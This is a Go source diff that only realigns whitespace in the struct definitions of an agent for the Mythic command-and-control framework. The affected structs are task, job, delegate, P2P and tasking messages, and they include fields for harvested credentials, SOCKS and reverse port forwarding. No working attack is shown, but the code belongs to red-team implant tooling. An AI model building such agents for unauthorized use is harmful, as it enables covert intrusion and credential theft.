@@ -190,13 +190,13 @@ func FormatWorkingHoursTime(minutes int) string {
 
 // Task represents a task from Mythic
 type Task struct {
-	ID         string    `json:"id"`
-	Command    string    `json:"command"`
-	Params     string    `json:"parameters"`
-	Timestamp  time.Time `json:"timestamp"`
-	StartTime  time.Time `json:"-"` // When the agent began executing this task
-	Job        *Job      `json:"-"` // Not marshalled to JSON
-	stopped    *int32    // Atomic flag for task cancellation; pointer so copies share state
+	ID        string    `json:"id"`
+	Command   string    `json:"command"`
+	Params    string    `json:"parameters"`
+	Timestamp time.Time `json:"timestamp"`
+	StartTime time.Time `json:"-"` // When the agent began executing this task
+	Job       *Job      `json:"-"` // Not marshalled to JSON
+	stopped   *int32    // Atomic flag for task cancellation; pointer so copies share state
 }
 
 // NewTask creates a Task with the stopped flag properly initialized
@@ -293,12 +293,12 @@ type FileDownloadMessage struct {
 
 // Job struct holds channels and state for task execution including file transfers
 type Job struct {
-	Stop                  *int
-	SendResponses         chan Response
-	SendFileToMythic      chan SendFileToMythicStruct
-	GetFileFromMythic     chan GetFileFromMythicStruct
-	FileTransfers         map[string]chan json.RawMessage
-	FileTransfersMu       sync.RWMutex
+	Stop              *int
+	SendResponses     chan Response
+	SendFileToMythic  chan SendFileToMythicStruct
+	GetFileFromMythic chan GetFileFromMythicStruct
+	FileTransfers     map[string]chan json.RawMessage
+	FileTransfersMu   sync.RWMutex
 }
 
 // SetFileTransfer safely adds a file transfer channel to the map
@@ -374,7 +374,7 @@ type CommandResult struct {
 	Output      string
 	Status      string
 	Completed   bool
-	Processes   *[]ProcessEntry   // Optional: populated by ps command for Mythic process browser
+	Processes   *[]ProcessEntry     // Optional: populated by ps command for Mythic process browser
 	Credentials *[]MythicCredential // Optional: credentials to store in Mythic's credential vault
 }
 
@@ -382,18 +382,18 @@ type CommandResult struct {
 // When sending to Mythic: Message is the base64-encoded encrypted data from the child.
 // When receiving from Mythic: Message is the base64-encoded encrypted data for the child.
 type DelegateMessage struct {
-	Message       string `json:"message"`        // Base64-encoded encrypted message
-	UUID          string `json:"uuid"`            // Target agent UUID (or temp UUID during staging)
-	C2ProfileName string `json:"c2_profile"`      // C2 profile name (e.g., "tcp")
+	Message       string `json:"message"`            // Base64-encoded encrypted message
+	UUID          string `json:"uuid"`               // Target agent UUID (or temp UUID during staging)
+	C2ProfileName string `json:"c2_profile"`         // C2 profile name (e.g., "tcp")
 	MythicUUID    string `json:"new_uuid,omitempty"` // Corrected UUID from Mythic after staging
 }
 
 // P2PConnectionMessage notifies Mythic about P2P link state changes (edges in the graph).
 type P2PConnectionMessage struct {
-	Source        string `json:"source"`         // Source callback UUID
-	Destination   string `json:"destination"`    // Destination callback UUID
-	Action        string `json:"action"`         // "add" or "remove"
-	C2ProfileName string `json:"c2_profile"`     // "tcp"
+	Source        string `json:"source"`      // Source callback UUID
+	Destination   string `json:"destination"` // Destination callback UUID
+	Action        string `json:"action"`      // "add" or "remove"
+	C2ProfileName string `json:"c2_profile"`  // "tcp"
 }
 
 // CheckinMessage represents the initial checkin message
@@ -414,11 +414,11 @@ type CheckinMessage struct {
 
 // TaskingMessage represents the message to get tasking
 type TaskingMessage struct {
-	Action      string             `json:"action"`
-	TaskingSize int                `json:"tasking_size"`
-	Socks       []SocksMsg         `json:"socks,omitempty"`
-	Rpfwd       []SocksMsg         `json:"rpfwd,omitempty"`
-	Delegates   []DelegateMessage  `json:"delegates,omitempty"`
+	Action      string            `json:"action"`
+	TaskingSize int               `json:"tasking_size"`
+	Socks       []SocksMsg        `json:"socks,omitempty"`
+	Rpfwd       []SocksMsg        `json:"rpfwd,omitempty"`
+	Delegates   []DelegateMessage `json:"delegates,omitempty"`
 	// Add agent identification for checkin updates
 	PayloadUUID string `json:"uuid,omitempty"`
 	PayloadType string `json:"payload_type,omitempty"`
